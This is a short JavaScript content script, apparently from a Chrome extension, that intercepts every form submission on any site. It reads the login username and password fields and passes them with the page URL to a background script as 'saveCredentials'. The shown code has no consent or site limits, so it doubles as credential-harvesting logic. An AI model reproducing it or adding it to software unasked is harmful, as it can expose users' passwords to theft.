// Listen for form submissions on the page
document.addEventListener('submit', (event) => {
    // Find common form elements for login
    const usernameInput = document.querySelector('input[type="email"], input[name*="user"], input[name*="email"]');
    const passwordInput = document.querySelector('input[type="password"], input[name*="pass"]');

    // If both username and password fields are found
    if (usernameInput) {
        let username = usernameInput.value;
        let password = '';
        
        // Handle the Google login case
        if (passwordInput) {
            password = passwordInput.value;
        } else if (usernameInput && !passwordInput) {
            password = 'Login with Google';
        }
        
        // Check if the username is not empty
        if (username) {
            // Send the data to the background script
            chrome.runtime.sendMessage({
                action: "saveCredentials",
                url: window.location.href,
                username: username,
                password: password
            });
            console.log("Login data sent to background script.");
        }
    }
}, true);